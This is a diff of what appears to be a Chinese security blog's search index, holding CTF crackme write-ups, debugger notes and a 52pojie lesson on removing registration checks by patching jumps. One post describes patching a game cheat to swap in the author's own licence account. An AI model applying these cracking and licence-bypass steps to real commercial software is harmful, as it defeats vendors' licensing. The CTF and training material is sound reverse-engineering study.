常见异常</h3><blockquote><p>最常见的是执行INT 3指令时产生的异常。调试器有专门的代码处理INT 3<br>异常，而操作系统则把它和其他异常一样对待。<br>应用程序可能包含处理INT 3异常的指令，但附加调试器到程序后，调试器将获得首先处理异常权限。如果调试器将异常传给程序，程序的异常处理函数会处理它。</p><p>单步调试也作为操作系统内的一个异常来实现。标志寄存器中的陷阱标志（trap flag)用于单步 调试。陷阱标志置位后，处理器每执行一条指令就会产生异常。</p><p>当程序试图去访问一个它无权访问的内存位置时，将产生内存访问冲突（memory-access violation)异常。这种异常经常因为内存地址无效而发生，也可能是因为访问了受保护而无权访问的内存位置。</p><p>另外，一些指令只在处理器处于特权模式时才能执行。如果程序尝试着在非特权模式下执行它们，则处理器会产生异常。</p></blockquote><h2 id="8x5-使用调试器修改可执行文件"><a href="#8x5-使用调试器修改可执行文件" class="headerlink" title="8x5 使用调试器修改可执行文件"></a>8x5 使用调试器修改可执行文件</h2><p>调试器可以用来改变程序的执行方式。可以通过修改控制标志、指令指针或者代码本身等方式来改变程序执行的方式。</p><h2 id="8x6-修改可执行程序的实践"><a href="#8x6-修改可执行程序的实践" class="headerlink" title="8x6 修改可执行程序的实践"></a>8x6 修改可执行程序的实践</h2><p>End..</p><p>From <a href="https://kabeor.github.io/第8章 动态调试/">https://kabeor.github.io/第8章 动态调试/</a> bye</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 病毒分析 </category>
+          
+          <category> 《恶意代码分析实战》笔记 </category>
+          
+          <category> 第三篇 动态分析高级技术篇 </category>
           
       </categories>
       
@@ -1067,31 +1092,6 @@
     
     
     <entry>
-      <title>看雪.京东 2018CTF helloctf</title>
-      <link href="/%E7%9C%8B%E9%9B%AA.%E4%BA%AC%E4%B8%9C%202018CTF%20helloctf/"/>
-      <url>/%E7%9C%8B%E9%9B%AA.%E4%BA%AC%E4%B8%9C%202018CTF%20helloctf/</url>
-      
-        <content type="html"><![CDATA[<h1 id="看雪-京东-2018CTF-helloctf"><a href="#看雪-京东-2018CTF-helloctf" class="headerlink" title="看雪.京东 2018CTF helloctf"></a>看雪.京东 2018CTF helloctf</h1><p>IDA打开，<br><img src="https://i.loli.net/2018/07/19/5b5020b43dfee.jpg" alt="mark"></p><p>F5之后<br><img src="https://i.loli.net/2018/07/19/5b5020b4570af.jpg" alt="mark"></p><p>do…while循环就是核心算法<br>自己提取出来<br><img src="https://i.loli.net/2018/07/19/5b5020b47103a.jpg" alt="mark"></p><p>意思就很明显了，需要注意的就是asc_408044内是字符串%x，也就是16进制，sprintf是字符串类型格式化，很显然这里就是将输入字符串转换为16进制，strcat为将后一字符串加到前一字符串尾部，这里很显然就是32位0再加437261636b4d654a757374466f7246756e</p><p>所以我们只需要将其进行16进制转字符串即可(多个0可省略，只需补齐位数为偶数)<br><img src="https://i.loli.net/2018/07/19/5b5020b48cbe7.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/19/5b5020b4a4747.jpg" alt="mark"></p><p>From <a href="https://kabeor.github.io/看雪.京东 2018CTF helloctf/">https://kabeor.github.io/看雪.京东 2018CTF helloctf/</a> bye</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 逆向 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 逆向 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc</title>
       <link href="/%E7%9C%8B%E9%9B%AA.TSRC%202017CTF%E7%A7%8B%E5%AD%A3%E8%B5%9B%20ctf2017_Fpc/"/>
       <url>/%E7%9C%8B%E9%9B%AA.TSRC%202017CTF%E7%A7%8B%E5%AD%A3%E8%B5%9B%20ctf2017_Fpc/</url>
@@ -1117,11 +1117,36 @@
     
     
     <entry>
-      <title>百度杯十一月赛题CrackMe02</title>
-      <link href="/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%B8%80%E6%9C%88%E8%B5%9B%E9%A2%98CrackMe02/"/>
-      <url>/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%B8%80%E6%9C%88%E8%B5%9B%E9%A2%98CrackMe02/</url>
+      <title>看雪.京东 2018CTF helloctf</title>
+      <link href="/%E7%9C%8B%E9%9B%AA.%E4%BA%AC%E4%B8%9C%202018CTF%20helloctf/"/>
+      <url>/%E7%9C%8B%E9%9B%AA.%E4%BA%AC%E4%B8%9C%202018CTF%20helloctf/</url>
       
-        <content type="html"><![CDATA[<h1 id="百度杯十一月赛题CrackMe02"><a href="#百度杯十一月赛题CrackMe02" class="headerlink" title="百度杯十一月赛题CrackMe02"></a>百度杯十一月赛题CrackMe02</h1><p><img src="https://i.loli.net/2018/07/15/5b4b68ec5cd9d.jpg" alt="mark"></p><p>IDA查看导入函数，发现GetDlgaitemTextA只有一处调用<br><img src="https://i.loli.net/2018/07/15/5b4b68ec706ac.jpg" alt="mark"></p><p>打开OD，在GetDlgItemTextA下断点F9输入后断下<br><img src="https://i.loli.net/2018/07/15/5b4b68ec96019.jpg" alt="mark"></p><p>接下来就真的不会了。。。留着以后做吧</p><p>From <a href="https://kabeor.github.io/百度杯十一月赛题CrackMe02/">https://kabeor.github.io/百度杯十一月赛题CrackMe02/</a> bye</p>]]></content>
+        <content type="html"><![CDATA[<h1 id="看雪-京东-2018CTF-helloctf"><a href="#看雪-京东-2018CTF-helloctf" class="headerlink" title="看雪.京东 2018CTF helloctf"></a>看雪.京东 2018CTF helloctf</h1><p>IDA打开，<br><img src="https://i.loli.net/2018/07/19/5b5020b43dfee.jpg" alt="mark"></p><p>F5之后<br><img src="https://i.loli.net/2018/07/19/5b5020b4570af.jpg" alt="mark"></p><p>do…while循环就是核心算法<br>自己提取出来<br><img src="https://i.loli.net/2018/07/19/5b5020b47103a.jpg" alt="mark"></p><p>意思就很明显了，需要注意的就是asc_408044内是字符串%x，也就是16进制，sprintf是字符串类型格式化，很显然这里就是将输入字符串转换为16进制，strcat为将后一字符串加到前一字符串尾部，这里很显然就是32位0再加437261636b4d654a757374466f7246756e</p><p>所以我们只需要将其进行16进制转字符串即可(多个0可省略，只需补齐位数为偶数)<br><img src="https://i.loli.net/2018/07/19/5b5020b48cbe7.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/19/5b5020b4a4747.jpg" alt="mark"></p><p>From <a href="https://kabeor.github.io/看雪.京东 2018CTF helloctf/">https://kabeor.github.io/看雪.京东 2018CTF helloctf/</a> bye</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 逆向 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 逆向 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>百度杯十一月赛题CrackMe01</title>
+      <link href="/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%B8%80%E6%9C%88%E8%B5%9B%E9%A2%98CrackMe01/"/>
+      <url>/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%B8%80%E6%9C%88%E8%B5%9B%E9%A2%98CrackMe01/</url>
+      
+        <content type="html"><![CDATA[<h1 id="百度杯十一月赛题CrackMe01"><a href="#百度杯十一月赛题CrackMe01" class="headerlink" title="百度杯十一月赛题CrackMe01"></a>百度杯十一月赛题CrackMe01</h1><blockquote><p>1</p></blockquote><p><img src="https://i.loli.net/2018/07/15/5b4b686f276b8.jpg" alt="mark"></p><p>用IDA打开，只有一个信息框，所以从弹窗下手</p><p>搜索message  API<br><img src="https://i.loli.net/2018/07/15/5b4b686f5976a.jpg" alt="mark"></p><p>看到MessageBoxW<br><img src="https://i.loli.net/2018/07/15/5b4b686f7bef4.jpg" alt="mark"><br>双击进去，Ctrl+X查看调用，发现没有被调用，于是放过</p><p>弹窗有可能为窗口类，搜索window<br><img src="https://i.loli.net/2018/07/15/5b4b686f91534.jpg" alt="mark"></p><p>找到ShowWindow</p><p><img src="https://i.loli.net/2018/07/15/5b4b686fa4fa6.jpg" alt="mark"><br>双击进入</p><p><img src="https://i.loli.net/2018/07/15/5b4b686fbae37.jpg" alt="mark"><br>自定义消息的位置</p><p>004028A5处      ebx累加</p><p>查看发送消息的API<br><img src="https://i.loli.net/2018/07/15/5b4b686fcf573.jpg" alt="mark"></p><p>Post MessageW</p><p>进入<br><img src="https://i.loli.net/2018/07/15/5b4b686fe2642.jpg" alt="mark"></p><p>F5查看伪码<br><img src="https://i.loli.net/2018/07/15/5b4b6870041ab.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/15/5b4b689d6bd56.jpg" alt="mark"><br>把eax里的数组取出2c的长度，异或即可</p><blockquote><p>2</p></blockquote><p>通过ShowWindow 定位到进行判断的函数<br><img src="https://i.loli.net/2018/07/15/5b4b689d91d47.jpg" alt="mark"><br>可以发现这里的 DrawTextW 就是将chText打印到程序中央。<br>  <img src="https://i.loli.net/2018/07/15/5b4b689db54bc.jpg" alt="mark"><br>可以看到这里有一堆Unicode编码的 文本。然后在程序上往上翻<br><img src="https://i.loli.net/2018/07/15/5b4b689ddb846.jpg" alt="mark"><br>这里对chText按位用同一个字符进行异或。 直接爆破。<br>  <img src="https://i.loli.net/2018/07/15/5b4b689e41076.jpg" alt="mark"><br> <img src="https://i.loli.net/2018/07/15/5b4b689e54214.jpg" alt="mark"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char flag[] = &#123; 0xF0,0xDA,0xD7,0xD1,0x8C,0xFF,0xF5,0xFE,0xE3,0xF8,0xE7,0xFF,0xE3,0xE9,0xF0,0xF3,0x85,0x80,0x84,0xF2,0xF4,0xF3,0 &#125;;</span><br><span class="line"></span><br><span class="line">for (int x = 0; x &lt; 0xFF; x++)</span><br><span class="line">&#123;</span><br><span class="line">for (int i = 0; i &lt; strlen(flag); i++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%c&quot;,flag[i] ^ x);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot; %X\n&quot;, x);</span><br><span class="line">&#125;</span><br><span class="line">cin.get();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/07/15/5b4b689e76b06.jpg" alt="mark"></p><p>ICHUNQIU_FE362DBE</p><p>From <a href="https://kabeor.github.io/百度杯十一月赛题CrackMe01/">https://kabeor.github.io/百度杯十一月赛题CrackMe01/</a> bye</p>]]></content>
       
       
       <categories>
@@ -1148,11 +1173,11 @@
     
     
     <entry>
-      <title>百度杯十一月赛题CrackMe01</title>
-      <link href="/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%B8%80%E6%9C%88%E8%B5%9B%E9%A2%98CrackMe01/"/>
-      <url>/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%B8%80%E6%9C%88%E8%B5%9B%E9%A2%98CrackMe01/</url>
+      <title>百度杯十一月赛题CrackMe02</title>
+      <link href="/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%B8%80%E6%9C%88%E8%B5%9B%E9%A2%98CrackMe02/"/>
+      <url>/%E7%99%BE%E5%BA%A6%E6%9D%AF%E5%8D%81%E4%B8%80%E6%9C%88%E8%B5%9B%E9%A2%98CrackMe02/</url>
       
-        <content type="html"><![CDATA[<h1 id="百度杯十一月赛题CrackMe01"><a href="#百度杯十一月赛题CrackMe01" class="headerlink" title="百度杯十一月赛题CrackMe01"></a>百度杯十一月赛题CrackMe01</h1><blockquote><p>1</p></blockquote><p><img src="https://i.loli.net/2018/07/15/5b4b686f276b8.jpg" alt="mark"></p><p>用IDA打开，只有一个信息框，所以从弹窗下手</p><p>搜索message  API<br><img src="https://i.loli.net/2018/07/15/5b4b686f5976a.jpg" alt="mark"></p><p>看到MessageBoxW<br><img src="https://i.loli.net/2018/07/15/5b4b686f7bef4.jpg" alt="mark"><br>双击进去，Ctrl+X查看调用，发现没有被调用，于是放过</p><p>弹窗有可能为窗口类，搜索window<br><img src="https://i.loli.net/2018/07/15/5b4b686f91534.jpg" alt="mark"></p><p>找到ShowWindow</p><p><img src="https://i.loli.net/2018/07/15/5b4b686fa4fa6.jpg" alt="mark"><br>双击进入</p><p><img src="https://i.loli.net/2018/07/15/5b4b686fbae37.jpg" alt="mark"><br>自定义消息的位置</p><p>004028A5处      ebx累加</p><p>查看发送消息的API<br><img src="https://i.loli.net/2018/07/15/5b4b686fcf573.jpg" alt="mark"></p><p>Post MessageW</p><p>进入<br><img src="https://i.loli.net/2018/07/15/5b4b686fe2642.jpg" alt="mark"></p><p>F5查看伪码<br><img src="https://i.loli.net/2018/07/15/5b4b6870041ab.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/15/5b4b689d6bd56.jpg" alt="mark"><br>把eax里的数组取出2c的长度，异或即可</p><blockquote><p>2</p></blockquote><p>通过ShowWindow 定位到进行判断的函数<br><img src="https://i.loli.net/2018/07/15/5b4b689d91d47.jpg" alt="mark"><br>可以发现这里的 DrawTextW 就是将chText打印到程序中央。<br>  <img src="https://i.loli.net/2018/07/15/5b4b689db54bc.jpg" alt="mark"><br>可以看到这里有一堆Unicode编码的 文本。然后在程序上往上翻<br><img src="https://i.loli.net/2018/07/15/5b4b689ddb846.jpg" alt="mark"><br>这里对chText按位用同一个字符进行异或。 直接爆破。<br>  <img src="https://i.loli.net/2018/07/15/5b4b689e41076.jpg" alt="mark"><br> <img src="https://i.loli.net/2018/07/15/5b4b689e54214.jpg" alt="mark"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char flag[] = &#123; 0xF0,0xDA,0xD7,0xD1,0x8C,0xFF,0xF5,0xFE,0xE3,0xF8,0xE7,0xFF,0xE3,0xE9,0xF0,0xF3,0x85,0x80,0x84,0xF2,0xF4,0xF3,0 &#125;;</span><br><span class="line"></span><br><span class="line">for (int x = 0; x &lt; 0xFF; x++)</span><br><span class="line">&#123;</span><br><span class="line">for (int i = 0; i &lt; strlen(flag); i++)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%c&quot;,flag[i] ^ x);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot; %X\n&quot;, x);</span><br><span class="line">&#125;</span><br><span class="line">cin.get();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/07/15/5b4b689e76b06.jpg" alt="mark"></p><p>ICHUNQIU_FE362DBE</p><p>From <a href="https://kabeor.github.io/百度杯十一月赛题CrackMe01/">https://kabeor.github.io/百度杯十一月赛题CrackMe01/</a> bye</p>]]></content>
+        <content type="html"><![CDATA[<h1 id="百度杯十一月赛题CrackMe02"><a href="#百度杯十一月赛题CrackMe02" class="headerlink" title="百度杯十一月赛题CrackMe02"></a>百度杯十一月赛题CrackMe02</h1><p><img src="https://i.loli.net/2018/07/15/5b4b68ec5cd9d.jpg" alt="mark"></p><p>IDA查看导入函数，发现GetDlgaitemTextA只有一处调用<br><img src="https://i.loli.net/2018/07/15/5b4b68ec706ac.jpg" alt="mark"></p><p>打开OD，在GetDlgItemTextA下断点F9输入后断下<br><img src="https://i.loli.net/2018/07/15/5b4b68ec96019.jpg" alt="mark"></p><p>接下来就真的不会了。。。留着以后做吧</p><p>From <a href="https://kabeor.github.io/百度杯十一月赛题CrackMe02/">https://kabeor.github.io/百度杯十一月赛题CrackMe02/</a> bye</p>]]></content>
       
       
       <categories>
@@ -1399,33 +1424,6 @@
     
     
     <entry>
-      <title>对新版本的某游戏辅助带vmp制作山寨补丁</title>
-      <link href="/%E5%AF%B9%E6%96%B0%E7%89%88%E6%9C%AC%E7%9A%84%E6%9F%90%E6%B8%B8%E6%88%8F%E8%BE%85%E5%8A%A9%E5%B8%A6vmp%E5%88%B6%E4%BD%9C%E5%B1%B1%E5%AF%A8%E8%A1%A5%E4%B8%81/"/>
-      <url>/%E5%AF%B9%E6%96%B0%E7%89%88%E6%9C%AC%E7%9A%84%E6%9F%90%E6%B8%B8%E6%88%8F%E8%BE%85%E5%8A%A9%E5%B8%A6vmp%E5%88%B6%E4%BD%9C%E5%B1%B1%E5%AF%A8%E8%A1%A5%E4%B8%81/</url>
-      
-        <content type="html"><![CDATA[<h1 id="对新版本的某游戏辅助带vmp制作山寨补丁"><a href="#对新版本的某游戏辅助带vmp制作山寨补丁" class="headerlink" title="对新版本的某游戏辅助带vmp制作山寨补丁"></a>对新版本的某游戏辅助带vmp制作山寨补丁</h1><p>还是上次那人写的辣鸡辅助，这次是最新版的，拿来看看<br>上篇链接<br><a href="https://kabeor.github.io/%E5%AF%B9%E6%9F%90%E6%B8%B8%E6%88%8F%E8%BE%85%E5%8A%A9%E7%9A%84%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/">对某游戏辅助的网络验证破解</a></p><h1 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h1><p><img src="https://i.loli.net/2018/07/15/5b4b61f6b0e05.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/15/5b4b61f72b183.jpg" alt="mark"></p><p>这次加了个vmp的壳，不过我们打补丁就行</p><h1 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h1><p>就不放图了，还是拿sniff抓，还是那人的号，上一篇提过</p><p>这次不采用二进制修改的方法，我们只需要用补丁将易游验证的号换成我们自己的</p><h1 id="补丁制作"><a href="#补丁制作" class="headerlink" title="补丁制作"></a>补丁制作</h1><p>我们使用XH补丁制作工具<br><img src="https://i.loli.net/2018/07/15/5b4b61f7763af.jpg" alt="mark"></p><p>首先我们需要原始的账号，就是下面这个<br><img src="https://i.loli.net/2018/07/15/5b4b61f85f097.jpg" alt="mark"></p><p>把/后面的那一串转换为16进制，粘贴进原始特征，再把我们自己的也转换为16进制，粘贴进目标数据。</p><p>点击上面Inline Hook，双击CreateWindowExa函数，<br><img src="https://i.loli.net/2018/07/15/5b4b61f921bcc.jpg" alt="mark"><br>其他可以自己设置，然后回去点生成补丁即可</p><p><img src="https://i.loli.net/2018/07/15/5b4b61f94a491.jpg" alt="mark"></p><h2 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h2><p>这辣鸡辅助这回能进去了，进游戏跳伞就封七天，幸亏我不玩这神仙游戏了</p><p>From <a href="https://kabeor.github.io/对新版本的某游戏辅助带vmp制作山寨补丁/">https://kabeor.github.io/对新版本的某游戏辅助带vmp制作山寨补丁/</a> bye</p>]]></content>
-      
-      
-      <categories>
-          
-          <category> 逆向 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 逆向 </tag>
-            
-            <tag> 破解 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>对强网杯2018“Web签到”的思考</title>
       <link href="/%E5%AF%B9%E5%BC%BA%E7%BD%91%E6%9D%AF2018%E2%80%9CWeb%E7%AD%BE%E5%88%B0%E2%80%9D%E7%9A%84%E6%80%9D%E8%80%83/"/>
       <url>/%E5%AF%B9%E5%BC%BA%E7%BD%91%E6%9D%AF2018%E2%80%9CWeb%E7%AD%BE%E5%88%B0%E2%80%9D%E7%9A%84%E6%80%9D%E8%80%83/</url>
@@ -1451,6 +1449,33 @@
             <tag> PHP漏洞 </tag>
             
             <tag> md5 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>对新版本的某游戏辅助带vmp制作山寨补丁</title>
+      <link href="/%E5%AF%B9%E6%96%B0%E7%89%88%E6%9C%AC%E7%9A%84%E6%9F%90%E6%B8%B8%E6%88%8F%E8%BE%85%E5%8A%A9%E5%B8%A6vmp%E5%88%B6%E4%BD%9C%E5%B1%B1%E5%AF%A8%E8%A1%A5%E4%B8%81/"/>
+      <url>/%E5%AF%B9%E6%96%B0%E7%89%88%E6%9C%AC%E7%9A%84%E6%9F%90%E6%B8%B8%E6%88%8F%E8%BE%85%E5%8A%A9%E5%B8%A6vmp%E5%88%B6%E4%BD%9C%E5%B1%B1%E5%AF%A8%E8%A1%A5%E4%B8%81/</url>
+      
+        <content type="html"><![CDATA[<h1 id="对新版本的某游戏辅助带vmp制作山寨补丁"><a href="#对新版本的某游戏辅助带vmp制作山寨补丁" class="headerlink" title="对新版本的某游戏辅助带vmp制作山寨补丁"></a>对新版本的某游戏辅助带vmp制作山寨补丁</h1><p>还是上次那人写的辣鸡辅助，这次是最新版的，拿来看看<br>上篇链接<br><a href="https://kabeor.github.io/%E5%AF%B9%E6%9F%90%E6%B8%B8%E6%88%8F%E8%BE%85%E5%8A%A9%E7%9A%84%E7%BD%91%E7%BB%9C%E9%AA%8C%E8%AF%81%E7%A0%B4%E8%A7%A3/">对某游戏辅助的网络验证破解</a></p><h1 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h1><p><img src="https://i.loli.net/2018/07/15/5b4b61f6b0e05.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/15/5b4b61f72b183.jpg" alt="mark"></p><p>这次加了个vmp的壳，不过我们打补丁就行</p><h1 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h1><p>就不放图了，还是拿sniff抓，还是那人的号，上一篇提过</p><p>这次不采用二进制修改的方法，我们只需要用补丁将易游验证的号换成我们自己的</p><h1 id="补丁制作"><a href="#补丁制作" class="headerlink" title="补丁制作"></a>补丁制作</h1><p>我们使用XH补丁制作工具<br><img src="https://i.loli.net/2018/07/15/5b4b61f7763af.jpg" alt="mark"></p><p>首先我们需要原始的账号，就是下面这个<br><img src="https://i.loli.net/2018/07/15/5b4b61f85f097.jpg" alt="mark"></p><p>把/后面的那一串转换为16进制，粘贴进原始特征，再把我们自己的也转换为16进制，粘贴进目标数据。</p><p>点击上面Inline Hook，双击CreateWindowExa函数，<br><img src="https://i.loli.net/2018/07/15/5b4b61f921bcc.jpg" alt="mark"><br>其他可以自己设置，然后回去点生成补丁即可</p><p><img src="https://i.loli.net/2018/07/15/5b4b61f94a491.jpg" alt="mark"></p><h2 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h2><p>这辣鸡辅助这回能进去了，进游戏跳伞就封七天，幸亏我不玩这神仙游戏了</p><p>From <a href="https://kabeor.github.io/对新版本的某游戏辅助带vmp制作山寨补丁/">https://kabeor.github.io/对新版本的某游戏辅助带vmp制作山寨补丁/</a> bye</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 逆向 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 逆向 </tag>
+            
+            <tag> 破解 </tag>
             
         </tags>
       
@@ -1600,35 +1625,6 @@
     
     
     <entry>
-      <title>吾爱破解培训第五课：反击作者的挑衅--实战解除程序重启验证</title>
-      <link href="/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%BA%94%E8%AF%BE%EF%BC%9A%E5%8F%8D%E5%87%BB%E4%BD%9C%E8%80%85%E7%9A%84%E6%8C%91%E8%A1%85--%E5%AE%9E%E6%88%98%E8%A7%A3%E9%99%A4%E7%A8%8B%E5%BA%8F%E9%87%8D%E5%90%AF%E9%AA%8C%E8%AF%81/"/>
-      <url>/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD%E7%AC%AC%E4%BA%94%E8%AF%BE%EF%BC%9A%E5%8F%8D%E5%87%BB%E4%BD%9C%E8%80%85%E7%9A%84%E6%8C%91%E8%A1%85--%E5%AE%9E%E6%88%98%E8%A7%A3%E9%99%A4%E7%A8%8B%E5%BA%8F%E9%87%8D%E5%90%AF%E9%AA%8C%E8%AF%81/</url>
-      
-        <content type="html"><![CDATA[<h1 id="吾爱破解培训第五课：反击作者的挑衅–实战解除程序重启验证"><a href="#吾爱破解培训第五课：反击作者的挑衅–实战解除程序重启验证" class="headerlink" title="吾爱破解培训第五课：反击作者的挑衅–实战解除程序重启验证"></a>吾爱破解培训第五课：反击作者的挑衅–实战解除程序重启验证</h1><blockquote><p>如何在OD中找到程序调用的一个API的所有位置</p></blockquote><p>OD字符串插件的使用<br>Ctrl+F搜索字符串</p><blockquote><p>熟悉OD如何下断点</p></blockquote><p>Ctrl+G:直接断API</p><p>Ctrl+N:输入表断API      </p><p>ctrl+N显示API窗口，直接搜索API，右键，查找函数参考，可给所有位置下断点</p><p>利用插件apibreak或api断点设置工具</p><blockquote><p>熟悉procmon的使用</p></blockquote><p>可以监控文件，注册表，网络，进线程信息</p><p>排除进程:ExClude</p><p>查看指定进程:Include</p><blockquote><p>熟悉文件操作API的使用</p></blockquote><pre><code>CreateFileA/W:创建文件ReadFile:读取文件WriteFile:写入文件CloseHandle:关闭句柄读取文件:CreateFile-&gt;ReadFile-&gt;CloseHandle写入文件:CreateFile-&gt;WriteFile-&gt;CloseHandle</code></pre><blockquote><p>熟悉注册表操作API的使用</p></blockquote><pre><code>创建注册表Key:RegCreateKey打开注册表Key:RegOpenKey查询注册表键值:RegQueryValue(Ex)写入注册表键值:RegSetValueEx</code></pre><h3 id="什么是重启验证"><a href="#什么是重启验证" class="headerlink" title="什么是重启验证"></a>什么是重启验证</h3><p>重启验证顾名思义就是在程序启动时验证注册信息。 </p><h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><p>基本的执行流程:注册信息输入–&gt;程序重启–&gt;执行验证机制–&gt;正常执行</p><p>扩展的执行流程:注册信息输入–&gt;执行部分验证机制/执行假验证机制–&gt;程序重启–&gt;执行真验证机制–&gt;正常执行</p><p>对于有经验的作者来说,可以在注册信息输入和程序重启之间加入假的验证机制,假的验证机制一般比较简单,比如说只是当单纯的明码比较,当我们输入这个假的注册码的,程序一般会提示注册成功,此时程序就会知道我们是逆向者,在程序重启时就会假装注册成功,在执行程序功能时就会报错或是无反应,这就是所谓的暗桩。</p><h3 id="重启验证的类型"><a href="#重启验证的类型" class="headerlink" title="重启验证的类型"></a>重启验证的类型</h3><p>重启验证根据写入信息位置的不同一般分两类,一类是将注册信息写入文件中,一类是将注册信息写入注册表中。</p><h3 id="定位关键代码"><a href="#定位关键代码" class="headerlink" title="定位关键代码"></a>定位关键代码</h3><p>1.字符串定位</p><p>通过OD字符串插件扫描敏感字符串,一般出现的文件路径或是注册表路径都可能是验证信息的保存位置</p><p>2.监控工具定位</p><p>通过procmon等监控工具监控注册信息的写入位置</p><p>3.API定位</p><p>通过定位CreateFile,RegCreateKey等API来获取注册信息的写入位置</p><h3 id="Demo演示"><a href="#Demo演示" class="headerlink" title="Demo演示"></a>Demo演示</h3><blockquote><p>重启验证1:写入信息进txt:             </p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">JXU2MjExJXU2</span><br></pre></td></tr></table></figure><p>CreateFile-&gt;WriteFile-&gt;ReadFile-&gt;比较算法</p><blockquote><p>重启验证2:写入信息进ini</p></blockquote><p>WritePrivateProfileStringA:写入配置信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0012F530   00544638  |Section = &quot;验证&quot;</span><br><span class="line">0012F534   00544634  |Key = &quot;Key&quot;</span><br><span class="line">0012F538   001C9578  |String = &quot;987654321&quot;</span><br><span class="line">0012F53C   001D7F70  \FileName = &quot;C:\Users\Administrator\Desktop\52Pojie.ini&quot;</span><br></pre></td></tr></table></figure><p>GetPrivateProfileStringA:读取配置信息</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NjJGJXU3NTI</span><br></pre></td></tr></table></figure><blockquote><p>重启验证3:写入信息进注册表</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4JXU2MjM3</span><br></pre></td></tr></table></figure><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><img src="https://i.loli.net/2018/07/14/5b49f5eea5ecd.jpg" alt="image"></p><blockquote><p>爆破方法</p></blockquote><p>OD打开，搜索字符串找到<br><img src="https://i.loli.net/2018/07/14/5b49f5eeb9313.jpg" alt="image"></p><p>跟随字符串    </p><pre><code>恭喜你发现彩蛋,这是一个解迷的彩蛋,请根据提示得到正解的注册码</code></pre><p><img src="https://i.loli.net/2018/07/14/5b49f5eecdaef.jpg" alt="image"><br>只要nop掉jnz就可以强制跳转，修改后出现彩蛋<br><img src="https://i.loli.net/2018/07/14/5b49f5eee03fc.jpg" alt="image"></p><blockquote><p>追码方法</p></blockquote><ol><li>52Pojie.txt：ITN3UXJGJ</li></ol><p>Ctrl+N 找ReadFile，查找输入函数参考，找到比较注册码的算法。<br>  <img src="https://i.loli.net/2018/07/14/5b49f5eef2418.jpg" alt="image"></p><ol><li>52Pojie.ini：jN2UXJxEjM2UXJ</li></ol><p>Ctrl+N 找GetPrivateProfileString，查找输入函数参考，找到比较注册码的算法。</p><p>真实注册码（密）：3A 1E 02 25 28 1A 48 15 3A 1D 02 25 28 1A</p><p>加0x30还原为真实注册码（明）：6A 4E 32 55 58 4A 78 45 6A 4D 32 55 58 4A<br>  <img src="https://i.loli.net/2018/07/14/5b49f5ef10e71.jpg" alt="image"></p><ol><li>HKEY_CURRENT_USER\Software\52Pojie：confirm  3MjM2UXJ4abc</li></ol><p>Ctrl+N 